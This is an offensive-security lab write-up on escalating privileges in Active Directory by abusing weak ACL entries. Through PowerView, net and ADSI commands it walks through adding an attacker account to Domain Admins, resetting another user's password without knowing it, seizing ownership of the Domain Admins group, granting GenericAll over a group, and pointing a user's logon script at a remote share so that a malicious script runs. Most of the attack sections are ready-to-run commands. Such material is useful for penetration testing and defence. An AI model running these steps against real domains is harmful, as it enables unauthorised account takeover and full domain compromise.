# Abusing Active Directory ACLs/ACEs

## Context

This lab is to abuse weak permissions of Active Directory Discretionary Access Control Lists \(DACLs\) and Acccess Control Entries \(ACEs\) that make up DACLs.

Active Directory objects such as users and groups are securable objects and DACL/ACEs define who can read/modify those objects \(i.e change account name, reset password, etc\). 

An example of ACEs for the "Domain Admins" securable object can be seen here:

![](../../.gitbook/assets/screenshot-from-2018-11-08-20-21-25.png)

Some of the Active Directory object permissions and types that we as attackers are interested in:

* **GenericAll** - full rights to the object \(add users to a group or reset user's password\)
* **GenericWrite** - update object's attributes \(i.e logon script\)
* **WriteOwner** - change object owner to attacker controlled user take over the object
* **WriteDACL** - modify object's ACEs and give attacker full control right over the object
* **AllExtendedRights** - ability to add user to a group or reset password
* **ForceChangePassword** - ability to change user's password
* **Self \(Self-Membership\)** - ability to add yourself to a group

In this lab, we are going to explore and try to exploit most of the above ACEs.

## Execution

### GenericAll on User

Using powerview, let's check if our attacking user `spotless` has `GenericAll rights` on the AD object for the user `delegate`:

```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}  
```

We can see that indeed our user `spotless` has the `GenericAll` rights, effectively enabling the attacker to take over the account:

![](../../.gitbook/assets/screenshot-from-2018-11-07-20-19-43.png)

We can reset user's `delegate` password without knowing the current password:

![](../../.gitbook/assets/screenshot-from-2018-11-07-20-21-30.png)

### GenericAll on Group

Let's see if `Domain admins` group has any weak permissions. First of, let's get its `distinguishedName`:

```csharp
Get-NetGroup "domain admins" -FullData
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-09-50-20.png)

```csharp
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local"}
```

We can see that our attacking user `spotless` has `GenericAll` rights once again:

![](../../.gitbook/assets/screenshot-from-2018-11-08-09-52-10.png)

Effectively, this allows us to add ourselves \(the user `spotless`\) to the `Domain Admin` group:

```csharp
net group "domain admins" spotless /add /domain
```

![](../../.gitbook/assets/peek-2018-11-08-10-07.gif)

Same could be achieved with Active Directory or PowerSploit module:

```csharp
# with active directory module
Add-ADGroupMember -Identity "domain admins" -Members spotless

# with Powersploit
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

### GenericAll / GenericWrite / Write on Computer

If you have these privileges on a Computer object, you can pull [Kerberos Resource-based Constrained Delegation: Computer Object Take Over](resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution.md) off.

### WriteProperty on Group

If our controlled user has `WriteProperty` right on `All` objects for `Domain Admin` group:

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-11-11.png)

We can again add ourselves to the `Domain Admins` group and escalate privileges:

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-06-32.png)

### Self \(Self-Membership\) on Group

Another privilege that enables the attacker adding themselves to a group:

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-23-52.png)

```csharp
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-11-25-23.png)

### WriteProperty \(Self-Membership\)

One more privilege that enables the attacker adding themselves to a group:

```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-15-21-35.png)

```csharp
net group "domain admins" spotless /add /domain
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-15-22-50.png)

### **ForceChangePassword**

If we have `ExtendedRight` on `User-Force-Change-Password` object type, we can reset the user's password without knowing their current password:

```csharp
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-12-30-11.png)

Doing the same with powerview:

```csharp
Set-DomainUserPassword -Identity delegate -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-12-31-52.png)

Another method that does not require fiddling with password-secure-string conversion:

```csharp
$c = Get-Credential
Set-DomainUserPassword -Identity delegate -AccountPassword $c.Password -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-14-11-25.png)

...or a one liner if no interactive session is not available:

```csharp
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-12-58-25.png)

### WriteOwner on Group

Note how before the attack the owner of `Domain Admins` is `Domain Admins`:

![](../../.gitbook/assets/screenshot-from-2018-11-08-16-45-36.png)

After the ACE enumeration, if we find that a user in our control has `WriteOwner` rights on `ObjectType:All`

```csharp
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-16-45-42.png)

...we can change the `Domain Admins` object's owner to our user, which in our case is `spotless`. Note that the SID specified with `-Identity` is the SID of the `Domain Admins` group:

```csharp
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-16-54-59.png)

### GenericWrite on User

```csharp
Get-ObjectAcl -ResolveGUIDs -SamAccountName delegate | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
```

![](../../.gitbook/assets/screenshot-from-2018-11-08-19-12-04.png)

`WriteProperty` on an `ObjectType`, which in this particular case is `Script-Path`, allows the attacker to overwrite the logon script path of the `delegate` user, which means that the next time, when the user `delegate` logs on, their system will execute our malicious script:

```csharp
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Below shows the user's ~~`delegate`~~ logon script field got updated in the AD:

![](../../.gitbook/assets/screenshot-from-2018-11-08-19-13-45.png)

### WriteDACL + WriteOwner

If you are the owner of a group, like I'm the owner of a `Test` AD group:

![](../../.gitbook/assets/screenshot-from-2018-11-10-19-02-57.png)

Which you can of course do through powershell:

```csharp
([ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local").PSBase.get_ObjectSecurity().GetOwner([System.Security.Principal.NTAccount]).Value
```

![](../../.gitbook/assets/screenshot-from-2018-11-10-19-29-27.png)

And you have a `WriteDACL` on that AD object:

![](../../.gitbook/assets/screenshot-from-2018-11-10-19-07-16.png)

...you can give yourself [`GenericAll`](abusing-active-directory-acls-aces.md#genericall-on-group) privileges with a sprinkle of ADSI sorcery:

```csharp
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

Which means you now fully control the AD object:

![](../../.gitbook/assets/screenshot-from-2018-11-10-19-02-49.png)

This effectively means that you can now add new users to the group.

Interesting to note that I could not abuse these privileges by using Active Directory module and `Set-Acl` / `Get-Acl` cmdlets:

```csharp
$path = "AD:\CN=test,CN=Users,DC=offense,DC=local"
$acl = Get-Acl -Path $path
$ace = new-object System.DirectoryServices.ActiveDirectoryAccessRule (New-Object System.Security.Principal.NTAccount "spotless"),"GenericAll","Allow"
$acl.AddAccessRule($ace)
Set-Acl -Path $path -AclObject $acl
```

![](../../.gitbook/assets/screenshot-from-2018-11-10-19-09-08.png)

## References

{% embed url="https://wald0.com/?p=112" %}

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2" %}

{% embed url="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" %}

{% embed url="https://adsecurity.org/?p=3658" %}

{% embed url="https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2\#System\_DirectoryServices\_ActiveDirectoryAccessRule\_\_ctor\_System\_Security\_Principal\_IdentityReference\_System\_DirectoryServices\_ActiveDirectoryRights\_System\_Security\_AccessControl\_AccessControlType\_" %}

[PowerView Tricks](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)

